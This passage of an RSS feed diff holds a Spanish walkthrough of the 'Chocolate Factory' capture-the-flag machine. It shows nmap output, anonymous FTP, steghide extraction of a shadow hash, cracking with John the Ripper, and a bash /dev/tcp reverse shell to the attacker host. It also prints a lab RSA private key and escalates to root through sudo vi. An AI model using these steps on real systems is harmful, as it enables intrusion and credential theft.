+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+110/tcp open  pop3?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+111/tcp open  rpcbind?
+| fingerprint-strings: 
+|   NULL, RPCCheck: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+112/tcp open  mcidas?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+113/tcp open  ident?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, NCP, NULL, RPCCheck, SMBProgNeg, TerminalServerCookie, oracle-tns: 
+|_    http://localhost/key_rev_key &amp;lt;- You will find the key here!!!
+114/tcp open  audionews?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+115/tcp open  sftp?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+116/tcp open  ansanotify?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+117/tcp open  uucp-path?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+118/tcp open  sqlserv?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+119/tcp open  nntp?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+120/tcp open  cfdptkt?
+| fingerprint-strings: 
+|   GetRequest, HTTPOptions: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+121/tcp open  erpc?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+122/tcp open  smakynet?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+123/tcp open  ntp?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+124/tcp open  ansatrader?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+125/tcp open  locus-map?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;Parámetro&lt;/th&gt;
+&lt;th&gt;Función&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;-p&lt;/td&gt;
+&lt;td&gt;Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;-sC&lt;/td&gt;
+&lt;td&gt;Para que realice scripts básicos de reconocimiento&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;-sV&lt;/td&gt;
+&lt;td&gt;Proporciona la versión e información de los servicios que corren por los puertos&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;puerto-80&#34;&gt;Puerto 80&lt;/h2&gt;
+&lt;p&gt;Con el whatweb podemos ver más información de la web&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ whatweb 10.10.250.47
+http://10.10.250.47 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.250.47], PasswordField[password]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Al entrar a la web hay un panel de login, e probado con admin:admin y las típicas credenciales pero nada.&lt;/p&gt;
+&lt;p&gt;El wappalayzer no reporta nada interesante.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/images/login.png&#34;
+	width=&#34;742&#34;
+	height=&#34;639&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/images/login_hu55794d4730ab618d4be8c0191c88d201_267686_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/images/login_hu55794d4730ab618d4be8c0191c88d201_267686_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;116&#34;
+		data-flex-basis=&#34;278px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;puerto-21&#34;&gt;Puerto 21&lt;/h2&gt;
+&lt;p&gt;El nmap reporto que se podía entrar al puerto 21 como anónimo (&lt;code&gt;ftp-anon: Anonymous FTP login allowed&lt;/code&gt;)&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ ftp 10.10.250.47
+Connected to 10.10.250.47.
+220 (vsFTPd 3.0.3)
+Name (10.10.250.47:d3b0): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Dentro solo hay una foto &lt;code&gt;gum_room.jpg&lt;/code&gt;, con &lt;code&gt;get gum_room.jpg&lt;/code&gt; nos la podemos pasar a nuestra máquina, la foto es la siguiente:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/images/gum.png&#34;
+	width=&#34;1543&#34;
+	height=&#34;872&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/images/gum_hu6cf4d5dd282a715f610d0635eab1306f_1410051_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/images/gum_hu6cf4d5dd282a715f610d0635eab1306f_1410051_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;176&#34;
+		data-flex-basis=&#34;424px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Para ver si hay algo oculto en la foto usamos steghide&lt;/p&gt;
+&lt;p&gt;Steghide es un software de esteganografía de código abierto que permite ocultar un archivo secreto en un archivo de imagen o audio.&lt;/p&gt;
+&lt;p&gt;No notarás ningún cambio en la imagen o el archivo de audio. Sin embargo, el archivo secreto estará dentro de la imagen original o el archivo de audio. Es un software de línea de comando.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#Si no tienes instalado el &amp;quot;steghide&amp;quot; lo puedes descargar con
+sudo apt install steghide
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ steghide extract -sf gum_room.jpg
+Anotar salvoconducto: 
+anot� los datos extra�dos e/&amp;quot;b64.txt&amp;quot;.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora se a creado un archivo b64.txt que está encriptado con base64&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cat b64.txt | base64 -d &amp;gt; decode.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora en el decode.txt ya está el contenido&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;...
+...
+charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Esto parece ser el /etc/shadow&lt;/p&gt;
+&lt;p&gt;El fichero /etc/shadow almacena las contraseñas de las cuentas de usuario. Se utiliza este fichero por seguridad. /etc/shadow es un archivo de texto que contiene información sobre las contraseñas de los usuarios del sistema. Es propiedad del usuario root y del grupo oculto&lt;/p&gt;
+&lt;p&gt;Al final de todo se puede ver el usuario charlie, junto a un hash sha512 (se puede saber que tipo es porque empieza con $6$)&lt;/p&gt;
+&lt;p&gt;Para romper el hash vamos a usar John the Ripper, que es una herramienta para recuperación de contraseñas. Originalmente desarrollado para el sistema operativo Unix&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo apt install john
+echo &amp;quot;hash&amp;quot; &amp;gt; myhash.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt mihash.hash
+john --show mihash.hash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;homephp&#34;&gt;home.php&lt;/h2&gt;
+&lt;p&gt;Esto nos devuelve el usuario charlie con la contraseña, al probarlos en la web, nos lleva a otra página.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/images/remote.png&#34;
+	width=&#34;657&#34;
+	height=&#34;360&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/images/remote_hud27725407893b15b7d96a74ea8ab70cd_217590_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/images/remote_hud27725407893b15b7d96a74ea8ab70cd_217590_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;182&#34;
+		data-flex-basis=&#34;438px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Desde aquí se pueden ejecutar comandos a la máquina víctima.&lt;/p&gt;
+&lt;h2 id=&#34;reverse-shell&#34;&gt;Reverse shell&lt;/h2&gt;
+&lt;p&gt;Primero nos ponemos en escucha por el puerto 443&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;nc -nlvp 443
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Intentamos crear una reverse shell mandando &lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.10/443 0&amp;gt;&amp;amp;1&lt;/code&gt;, pero no recibimos nada, probamos añadiendo (bash -c &amp;ldquo;&amp;rdquo;) de tal forma que quede así &lt;code&gt;bash -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.10/443 0&amp;gt;&amp;amp;1&amp;quot;&lt;/code&gt; Ahora ya si&lt;/p&gt;
+&lt;h2 id=&#34;tratamiento-de-la-tty&#34;&gt;Tratamiento de la tty&lt;/h2&gt;
+&lt;p&gt;Antes para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;script /dev/null -c bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;ctrl + z&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;stty raw -echo; fg
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;reset
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;xterm
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;export SHELL=bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;export TERM=xterm
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;escalada-a-charlie&#34;&gt;Escalada a charlie&lt;/h2&gt;
+&lt;p&gt;En el /home/charlie hay un user.txt, pero no tenemos acceso para leerlo. Hay un archivo llamado teleport ahí hay una RSA private key.&lt;/p&gt;
+&lt;p&gt;Una llave RSA es una llave generada por el algoritmo RSA. Esta llave está compuesta por dos partes, una parte pública y otra parte privada.&lt;/p&gt;
+&lt;p&gt;Desde nuestra máquina guardamos esa key en un archivo llamado id_rsa&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ cat id_rsa
+───────┬──────────────────────────────────────────────────────────────────────────────────
+       │ File: id_rsa
+───────┼──────────────────────────────────────────────────────────────────────────────────
+   1   │ -----BEGIN RSA PRIVATE KEY-----
+   2   │ MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW
+   3   │ 1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb
+   4   │ L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj
+   5   │ B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY
+   6   │ fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE
+   7   │ RaObPlb0dRy3KoN79lt+dh+jSg/dM/TYYe5L4wIDAQABAoIBAD2TzjQDYyfgu4Ej
+   8   │ Di32Kx+Ea7qgMy5XebfQYquCpUjLhK+GSBt9knKoQb9OHgmCCgNG3+Klkzfdg3g9
+   9   │ zAUn1kxDxFx2d6ex2rJMqdSpGkrsx5HwlsaUOoWATpkkFJt3TcSNlITquQVDe4tF
+  10   │ w8JxvJpMs445CWxSXCwgaCxdZCiF33C0CtVw6zvOdF6MoOimVZf36UkXI2FmdZFl
+  11   │ kR7MGsagAwRn1moCvQ7lNpYcqDDNf6jKnx5Sk83R5bVAAjV6ktZ9uEN8NItM/ppZ
+  12   │ j4PM6/IIPw2jQ8WzUoi/JG7aXJnBE4bm53qo2B4oVu3PihZ7tKkLZq3Oclrrkbn2
+  13   │ EY0ndcECgYEA/29MMD3FEYcMCy+KQfEU2h9manqQmRMDDaBHkajq20KvGvnT1U/T
+  14   │ RcbPNBaQMoSj6YrVhvgy3xtEdEHHBJO5qnq8TsLaSovQZxDifaGTaLaWgswc0biF
+  15   │ uAKE2uKcpVCTSewbJyNewwTljhV9mMyn/piAtRlGXkzeyZ9/muZdtesCgYEA4idA
+  16   │ KuEj2FE7M+MM/+ZeiZvLjKSNbiYYUPuDcsoWYxQCp0q8HmtjyAQizKo6DlXIPCCQ
+  17   │ RZSvmU1T3nk9MoTgDjkNO1xxbF2N7ihnBkHjOffod+zkNQbvzIDa4Q2owpeHZL19
+  18   │ znQV98mrRaYDb5YsaEj0YoKfb8xhZJPyEb+v6+kCgYAZwE+vAVsvtCyrqARJN5PB
+  19   │ la7Oh0Kym+8P3Zu5fI0Iw8VBc/Q+KgkDnNJgzvGElkisD7oNHFKMmYQiMEtvE7GB
+  20   │ FVSMoCo/n67H5TTgM3zX7qhn0UoKfo7EiUR5iKUAKYpfxnTKUk+IW6ME2vfJgsBg
+  21   │ 82DuYPjuItPHAdRselLyNwKBgH77Rv5Ml9HYGoPR0vTEpwRhI/N+WaMlZLXj4zTK
+  22   │ 37MWAz9nqSTza31dRSTh1+NAq0OHjTpkeAx97L+YF5KMJToXMqTIDS+pgA3fRamv
+  23   │ ySQ9XJwpuSFFGdQb7co73ywT5QPdmgwYBlWxOKfMxVUcXybW/9FoQpmFipHsuBjb
+  24   │ Jq4xAoGBAIQnMPLpKqBk/ZV+HXmdJYSrf2MACWwL4pQO9bQUeta0rZA6iQwvLrkM
+  25   │ Qxg3lN2/1dnebKK5lEd2qFP1WLQUJqypo5TznXQ7tv0Uuw7o0cy5XNMFVwn/BqQm
+  26   │ G2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln
+  27   │ -----END RSA PRIVATE KEY-----
+───────┴──────────────────────────────────────────────────────────────────────────────────
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora nos podemos conectar por ssh como charlie&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;ssh -i id_rsa charlie@10.10.94.87
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ya somos charlie y podemos ver la flag de usuario&lt;/p&gt;
+&lt;h2 id=&#34;escalada-root&#34;&gt;Escalada root&lt;/h2&gt;
+&lt;p&gt;Con &lt;code&gt;sudo -l&lt;/code&gt; podemos ver todos los comandos que charlie puede ejecutar. Ahí podemos ver que el /usr/bin/vi lo puede ejecutar con sudo sin proporcionar contraseña&lt;/p&gt;
+&lt;p&gt;vi (Visual) es un programa que entra en la categoría de los editores de texto, pues a diferencia de un procesador de texto no ofrece herramientas para determinar visualmente cómo quedará el documento impreso. Por esto carece de opciones como centrado o justificación de párrafos, pero permite mover, copiar, eliminar o insertar caracteres con mucha versatilidad. Este tipo de programas es frecuentemente utilizado por programadores para escribir código.&lt;/p&gt;
+&lt;p&gt;Ejecutar vi como root&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sudo vi&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;ctrl + c&lt;/p&gt;
+&lt;p&gt;Y por último escribir :shell en la linea de abajo&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;:shell&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/images/root.png&#34;
+	width=&#34;887&#34;
+	height=&#34;1000&#34;
+	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/images/root_hub0a3254ffb2d65b16ba2d1c32daea127_98997_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/images/root_hub0a3254ffb2d65b16ba2d1c32daea127_98997_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;88&#34;
+		data-flex-basis=&#34;212px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;¡Ya somos root!&lt;/p&gt;
+&lt;h2 id=&#34;rootpy-puertos-100---125&#34;&gt;root.py (Puertos 100 - 125)&lt;/h2&gt;
+&lt;p&gt;En el directorio /root  hay un archivo llamado root.py el cual al ejecutarlo &lt;code&gt;pyhton root.py&lt;/code&gt; pide una key: Volviendo al nmap que encontró 25 puertos tcp en los cuales todos pone lo mismo:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Menos uno, el 113, que pone:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://localhost/key_rev_key &amp;lt;- You will find the key here!!!
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Cuando entramos al &lt;code&gt;http://10.10.94.87/key_rev_key&lt;/code&gt; nos descarga un archivo llamado &lt;code&gt;key_rev_key&lt;/code&gt;, al abrirlo nos pide un nombre, e probado con charlie, Mr.Wonka, root, admin, etc&amp;hellip; pero nada.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;chmod +x key_rev_key
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ ./key_rev_key
+Enter your name: charlie
+Bad name!
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Al hacer un nano al archivo hay una línea que pone:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;congratulations you have found the key:   ^@^@^@^@b&#39;-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=&#39;^@`
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;¡Ya tenemos la key!&lt;/p&gt;
+&lt;p&gt;También hay otra línea en la cual se puede ver el nombre correcto&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;Enter your name: �%s� laksdhfas��
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;❯ ./key_rev_key
+Enter your name: laksdhfas
+
+ congratulations you have found the key:   b&#39;-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=&#39;
+ Keep its safe
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;root-flag&#34;&gt;Root flag&lt;/h2&gt;
+&lt;p&gt;Ahora ya podemos ejecutar el &lt;code&gt;root.py&lt;/code&gt; que está en &lt;code&gt;/root&lt;/code&gt; y poner la key.&lt;/p&gt;
+&lt;p&gt;¡Nos responde con la flag de root!&lt;/p&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
